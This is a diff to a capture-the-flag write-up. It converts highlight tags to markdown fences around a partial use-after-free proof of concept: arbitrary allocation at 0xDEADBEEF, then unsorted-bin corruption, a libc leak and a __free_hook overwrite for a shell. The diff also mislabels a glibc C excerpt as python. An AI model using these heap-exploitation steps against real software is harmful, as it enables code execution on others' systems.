@@ -16,7 +16,7 @@ This challenge still has a clear UAF (Use-After-Free) vulnerability. Freeing a u
 
 Here is a POC (Proof of Concept) for arbitrary allocation: (allocating a chunk at 0xDEADBEEF)
 
-{% highlight python %}
+```python
 def add_user(username,password):
     sla("> ","2")
     sa("> ",username)
@@ -45,14 +45,14 @@ change_pass(new_user,"fake2")
 free_user(new_user)
 add_user(p64(0xDEADBEEF),p64(0))
 add_user("eee","fff")
-{% endhighlight %}
+```
 
 Afterwards, we can allocate and modify the size of other user chunk headers, causing the user to be placed in the unsorted bin when freed. It is important to arrange the heap properly because the `prev_inuse` bit of the next chunk is checked when attempting to free into the unsorted bin.
 
-{% highlight c %}
+```python
 if (__glibc_unlikely (!prev_inuse(nextchunk))) // here
       malloc_printerr ("double free or corruption (!prev)");
-{% endhighlight %}
+```
 
 After that we have libc leak and we can use the same method to overwrite `__free_hook` to get shell.
 
